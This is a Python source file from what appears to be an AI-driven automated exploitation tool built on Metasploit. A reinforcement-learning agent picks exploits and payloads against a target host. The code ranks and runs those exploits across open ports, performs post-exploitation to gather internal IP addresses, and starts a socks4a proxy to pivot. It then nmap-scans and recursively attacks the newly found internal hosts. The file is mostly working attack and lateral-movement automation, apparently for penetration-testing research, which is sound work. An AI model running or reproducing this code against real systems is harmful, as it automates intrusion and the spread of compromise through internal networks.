
from imports import *
from Constants import *

class Environment:
    total_reward_vec = np.zeros(10)
    count_trial_each_thread = 0

    def __init__(self, name, thread_type, parameter_server, rhost):
        self.name = name
        self.thread_type = thread_type
        self.env = Metasploit(rhost)
        self.agent = Agent(name, parameter_server)
        self.util = Utilty()

    def run(self, exploit_tree, target_tree):
        self.agent.brain.pull_parameter_server()  # Copy ParameterSever weight to LocalBrain
        global frames              # Total number of trial in total session.
        global isFinish            # Finishing of learning/testing flag.
        global exploit_count       # Number of successful exploitation.
        global post_exploit_count  # Number of successful post-exploitation.
        global plot_count          # Exploitation count list for plot.
        global plot_pcount         # Post-exploit count list for plot.

        if self.thread_type == 'test':
            # Execute exploitation.
            self.util.print_message(NOTE, 'Execute exploitation.')
            session_list = []
            for port_num in com_port_list:
                execute_list = []
                target_info = {}
                module_list = target_tree[port_num]['exploit']
                for exploit in module_list:
                    target_list = exploit_tree[exploit[8:]]['target_list']
                    for target in target_list:
                        skip_flag, s, payload_list, target_info = self.env.get_state(exploit_tree,
                                                                                     target_tree,
                                                                                     port_num,
                                                                                     exploit,
                                                                                     target)
                        if skip_flag is False:
                            # Get available payload index.
                            available_actions = self.env.get_available_actions(payload_list)

                            # Decide action using epsilon greedy.
                            frames = self.env.eps_steps
                            _, _, p_list = self.agent.act(s, available_actions, self.env.eps_steps)
                            # Append all payload probabilities.
                            if p_list is not None:
                                for prob in p_list:
                                    execute_list.append([prob[1], exploit, target, prob[0], target_info])
                        else:
                            continue

                # Execute action.
                execute_list.sort(key=lambda s: -s[0])
                for idx, exe_info in enumerate(execute_list):
                    # Execute exploit.
                    _, _, done, sess_info = self.env.execute_exploit(exe_info[3],
                                                                     self.name,
                                                                     self.thread_type,
                                                                     exe_info[2],
                                                                     exe_info[4],
                                                                     idx,
                                                                     exploit_tree)

                    # Store session information.
                    if len(sess_info) != 0:
                        session_list.append(sess_info)

                    # Change port number for next exploitation.
                    if done is True:
                        break

            # Execute post exploitation.
            new_target_list = []
            for session in session_list:
                self.util.print_message(NOTE, 'Execute post exploitation.')
                self.util.print_message(OK, 'Target session info.\n'
                                            '    session id   : {0}\n'
                                            '    session type : {1}\n'
                                            '    target port  : {2}\n'
                                            '    exploit      : {3}\n'
                                            '    target       : {4}\n'
                                            '    payload      : {5}'.format(session['id'],
                                                                            session['type'],
                                                                            session['port'],
                                                                            session['exploit'],
                                                                            session['target'],
                                                                            session['payload']))
                internal_ip_list = self.env.execute_post_exploit(session['id'], session['type'])
                for ip_addr in internal_ip_list:
                    if ip_addr not in self.env.prohibited_list and ip_addr != self.env.rhost:
                        new_target_list.append(ip_addr)
                    else:
                        self.util.print_message(WARNING, 'Target IP={} is prohibited.'.format(ip_addr))

            # Deep penetration.
            new_target_list = list(set(new_target_list))
            if len(new_target_list) != 0:
                # Launch Socks4a proxy.
                module = 'auxiliary/server/socks4a'
                self.util.print_message(NOTE, 'Set proxychains: SRVHOST={}, SRVPORT={}'.format(self.env.proxy_host,
                                                                                               str(self.env.proxy_port)))
                option = {'SRVHOST': self.env.proxy_host, 'SRVPORT': self.env.proxy_port}
                job_id, uuid = self.env.client.execute_module('auxiliary', module, option)
                if uuid is None:
                    self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
                    isFinish = True
                    return

                # Further penetration.
                self.env.source_host = self.env.rhost
                self.env.prohibited_list.append(self.env.rhost)
                self.env.isPostExploit = True
                self.deep_run(new_target_list)

            isFinish = True
        else:
            # Execute learning.
            skip_flag, s, payload_list, target_list, target_info = self.env.reset_state(exploit_tree, target_tree)

            # If product name is 'unknown', skip.
            if skip_flag is False:
                R = 0
                step = 0
                while True:
                    # Decide action (randomly or epsilon greedy).
                    available_actions = self.env.get_available_actions(payload_list)
                    a, _, _ = self.agent.act(s, available_actions, self.env.eps_steps)
                    # Execute action.
                    s_, r, done, _ = self.env.execute_exploit(a,
                                                              self.name,
                                                              self.thread_type,
                                                              target_list,
                                                              target_info,
                                                              step,
                                                              exploit_tree,
                                                              frames)
                    step += 1

                    # Update payload list according to new target.
                    payload_list = exploit_tree[target_info['exploit']]['targets'][str(self.env.state[ST_TARGET])]

                    # If trial exceed maximum number of trials at current episode,
                    # finish trial at current episode.
                    if step > MAX_STEPS:
                        done = True

                    # Increment frame number.
                    frames += 1

                    # Increment number of successful exploitation.
                    if r == R_GOOD:
                        exploit_count += 1

                    # Increment number of successful post-exploitation.
                    if r == R_GREAT:
                        exploit_count += 1
                        post_exploit_count += 1

                    # Plot number of successful post-exploitation each 100 frames.
                    if frames % 100 == 0:
                        self.util.print_message(NOTE, 'Plot number of successful post-exploitation.')
                        plot_count.append(exploit_count)
                        plot_pcount.append(post_exploit_count)
                        exploit_count = 0
                        post_exploit_count = 0

                    # Push reward and experience considering advantage.to LocalBrain.
                    if a == 'no payload':
                        a = len(com_payload_list) - 1
                    self.agent.advantage_push_local_brain(s, a, r, s_)

                    s = s_
                    R += r
                    # Copy updating ParameterServer weight each Tmax.
                    if done or (step % Tmax == 0):
                        if not (isFinish):
                            self.agent.brain.update_parameter_server()
                            self.agent.brain.pull_parameter_server()

                    if done:
                        # Discard the old total reward and keep the latest 10 pieces.
                        self.total_reward_vec = np.hstack((self.total_reward_vec[1:], step))
                        # Increment total trial number of thread.
                        self.count_trial_each_thread += 1
                        break

                # Output total number of trials, thread name, current reward to console.
                self.util.print_message(OK, 'Thread: {}, Trial num: {}, '
                                            'Step: {}, Avg step: {}'.format(self.name,
                                                                            str(self.count_trial_each_thread),
                                                                            str(step),
                                                                            str(self.total_reward_vec.mean())))

                # End of learning.
                if frames > MAX_TRAIN_NUM:
                    self.util.print_message(OK, 'Finish train:{}'.format(self.name))
                    isFinish = True
                    self.util.print_message(OK, 'Stopping learning...')
                    time.sleep(30.0)
                    # Push params of thread to ParameterServer.
                    self.agent.brain.push_parameter_server()

    # Further penetration.
    def deep_run(self, target_ip_list):
        for target_ip in target_ip_list:
            result_file = 'nmap_result_' + target_ip + '.xml'
            command = self.env.nmap_2nd_command + ' ' + result_file + ' ' + target_ip + '\n'
            self.env.execute_nmap(target_ip, command, self.env.nmap_2nd_timeout)
            com_port_list, proto_list, info_list = self.env.get_port_list(result_file, target_ip)

            # Get exploit tree and target info.
            exploit_tree = self.env.get_exploit_tree()
            target_tree = self.env.get_target_info(target_ip, proto_list, info_list)

            # Execute exploitation.
            self.env.rhost = target_ip
            self.run(exploit_tree, target_tree)